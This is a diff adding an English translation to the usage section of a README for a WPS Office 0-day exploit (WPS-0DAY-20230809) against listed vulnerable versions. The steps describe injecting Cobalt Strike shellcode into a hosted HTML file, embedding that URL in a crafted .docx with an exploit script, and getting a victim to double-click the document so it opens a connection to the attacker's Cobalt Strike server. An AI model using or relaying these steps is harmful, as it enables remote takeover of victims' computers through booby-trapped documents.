@@ -13,4 +13,14 @@ WPS Office 2023个人版＜11.1.0.15120; WPS Office 2019企业版＜11.8.2.12085
 
 3. 双击文档即可上线CS
 
+
+# WPS-0DAY-20230809
+WPS Office 2023 Personal Edition ＜11.1.0.15120; WPS Office 2019 Enterprise Edition ＜11.8.2.12085 
+## Usage
+1. `python replace_shellcode.py shellcode_32_raw.bin`
+   > Here, I am using a 32-bit payload from CS. Use `replace_shellcode.py` to replace the shellcode in `1.html`, then upload `1.html` to your hosting address, for example: http://127.0.0.1/1.html
+2. `python exp.py poc.docx http://127.0.0.1/1.html`
+   > Replace the URL in `poc.docx`, which is your hosting address
+3. Double-click the document to connect to CS
+
    
